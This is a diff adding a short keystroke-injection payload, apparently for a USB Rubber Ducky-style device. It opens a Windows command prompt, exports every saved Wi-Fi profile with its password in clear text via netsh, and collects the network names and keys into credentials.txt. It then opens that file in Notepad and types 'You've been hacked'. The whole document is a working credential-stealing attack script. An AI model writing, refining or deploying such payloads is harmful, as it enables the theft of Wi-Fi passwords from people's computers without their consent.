@@ -1,0 +1,23 @@
+DELAY 200
+GUI r
+DELAY 450
+STRING cmd
+ENTER
+DELAY 200
+STRING mkdir wifi-exfil
+ENTER
+DELAY 200
+STRING netsh wlan export profile folder=. key=clear
+ENTER
+DELAY 200
+STRING findstr /c:"<name>" /c:"<keyMaterial>" WLAN*.xml > credentials.txt
+ENTER
+DELAY 200
+STRING notepad credentials.txt
+ENTER
+DELAY 200
+ENTER
+ENTER
+DELAY 200
+STRING You've been hacked
+ENTER
